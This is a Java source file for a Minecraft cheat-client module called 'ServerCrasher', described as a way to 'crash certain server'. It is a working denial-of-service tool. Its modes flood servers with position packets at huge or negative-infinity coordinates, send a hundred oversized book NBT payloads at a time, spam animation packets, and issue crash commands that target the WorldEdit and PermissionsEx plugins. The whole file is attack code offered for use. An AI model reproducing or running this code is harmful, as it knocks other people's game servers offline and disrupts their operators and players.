package org.me.ByBlueHeart.HDebugClient.Modules.World;

import io.netty.buffer.Unpooled;
import net.blueheart.hdebug.event.*;
import net.blueheart.hdebug.features.module.Module;
import net.blueheart.hdebug.features.module.ModuleCategory;
import net.blueheart.hdebug.features.module.ModuleInfo;
import net.blueheart.hdebug.utils.misc.RandomUtils;
import net.blueheart.hdebug.utils.timer.MSTimer;
import net.blueheart.hdebug.value.ListValue;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.util.Random;

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
public class ServerCrasher extends Module {

    private final ListValue modeValue = new ListValue("Mode", new String[] {
            "Book",
            "Swing",
            "MassiveChunkLoading",
            "WorldEdit",
            "Pex",
            "CubeCraft",
            "AACNew", "AACOther", "AACOld",
    }, "Book");

    private MSTimer pexTimer = new MSTimer();

    @Override
    public void onEnable() {
        if(mc.thePlayer == null)
            return;

        switch(modeValue.get().toLowerCase()) {
            case "aacnew":
                // Spam positions
                for(int index = 0; index < 9999; ++index)
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                            mc.thePlayer.posX + 9412 * index,
                            mc.thePlayer.getEntityBoundingBox().minY + 9412 * index,
                            mc.thePlayer.posZ + 9412 * index,
                            true
                    ));
                break;
            case "aacother":
                // Spam positions
                for(int index = 0; index < 9999; ++index)
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                            mc.thePlayer.posX + 500000 * index,
                            mc.thePlayer.getEntityBoundingBox().minY + 500000 * index,
                            mc.thePlayer.posZ + 500000 * index,
                            true
                    ));
                break;
            case "aacold":
                // Send negative infinity position
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY,
                        Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                break;
            case "worldedit":
                // Send crash command
                mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            case "cubecraft":
                // Not really needed but doesn't matter
                mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3D, mc.thePlayer.posZ);
                break;
            case "massivechunkloading":
                // Fly up into sky
                for(double yPos = mc.thePlayer.posY; yPos < 255; yPos += 5)
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX,
                            yPos, mc.thePlayer.posZ, true));

                // Fly over world
                for(int i = 0; i < (1337 * 5); i += 5) {
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                            mc.thePlayer.posX + i, 255, mc.thePlayer.posZ + i, true
                    ));
                }
                break;
        }
    }

    @EventTarget
    public void onMotion(final MotionEvent event) {
        if(event.getEventState() == EventState.POST)
            return;

        switch(modeValue.get().toLowerCase()) {
            case "book":
                final ItemStack bookStack = new ItemStack(Items.writable_book);
                final NBTTagCompound bookCompound = new NBTTagCompound();

                bookCompound.setString("author", RandomUtils.randomNumber(20));
                bookCompound.setString("title", RandomUtils.randomNumber(20));

                final NBTTagList pageList = new NBTTagList();
                final String pageText = RandomUtils.randomNumber(600);

                for(int page = 0; page < 50; page++)
                    pageList.appendTag(new NBTTagString(pageText));

                bookCompound.setTag("pages", pageList);
                bookStack.setTagCompound(bookCompound);

                for(int packets = 0; packets < 100; packets++) {
                    final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(bookStack);
                    mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            case "cubecraft":
                final double x = mc.thePlayer.posX;
                final double y = mc.thePlayer.posY;
                final double z = mc.thePlayer.posZ;

                for(int i = 0; i < 3000; ++i) {
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x,
                            y + 0.09999999999999D, z, false));
                    mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                }
                mc.thePlayer.motionY = 0;
                break;
            case "pex":
                if(pexTimer.hasTimePassed(2000)) {
                    // Send crash command
                    mc.thePlayer.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                    pexTimer.reset();
                }
                break;
            case "swing":
                for (int i = 0; i < 5000; i++)
                    mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
                break;
            default:
                setState(false); // Disable module when mode is just a one run crasher
                break;
        }
    }

    @EventTarget
    public void onWorld(final WorldEvent event) {
        if(event.getWorldClient() == null)
            setState(false); // Disable module in case you left the server
    }

    @EventTarget
    public void onTick(final TickEvent event) {
        if(mc.thePlayer == null || mc.theWorld == null)
            setState(false); // Disable module in case you left the server
    }

    @Override
    public String getTag() {
        return modeValue.get();
    }
}